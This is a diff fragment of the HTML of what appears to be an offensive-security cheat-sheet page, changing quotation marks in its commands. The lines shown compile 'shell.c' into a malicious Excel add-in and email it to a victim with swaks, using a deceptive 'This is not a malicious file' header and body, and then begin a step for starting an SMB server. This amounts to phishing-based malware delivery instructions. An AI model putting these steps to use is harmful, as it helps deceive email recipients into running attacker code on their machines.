@@ -393,7 +393,7 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></span></code></pre></div><h4 id="1-compile-shellc-in-linux">1. Compile shell.c in Linux</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">x86_64-w64-mingw32-gcc -fPIC -shared -o shell.xll shell.c -luser32
 </span></span></span></code></pre></div><h4 id="2-send-email-with-the-malicious-xll-file">2. Send email with the malicious xll file</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">swaks --to &#39;&lt;VICTIM&gt;@&lt;DOMAIN&gt;&#39; --from &#39;attacker@&lt;DOMAIN&gt;&#39; --server &#39;&lt;DOMAIN&gt;&#39; --header &#34;This is not a malicious file&#34; --body &#34;This is not a malicious file&#34; --attach &#39;@shell.xll&#39;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">swaks --to &#39;&lt;VICTIM&gt;@&lt;DOMAIN&gt;&#39; --from &#39;attacker@&lt;DOMAIN&gt;&#39; --server &#39;&lt;DOMAIN&gt;&#39; --header &#39;This is not a malicious file&#39; --body &#39;This is not a malicious file&#39; --attach &#39;@shell.xll&#39;
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://www.revshells.com/">revshells.com</a></em></small></p></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab3"><h4 id="1-start-a-local-smb-server">1. Start a Local SMB Server</h4>
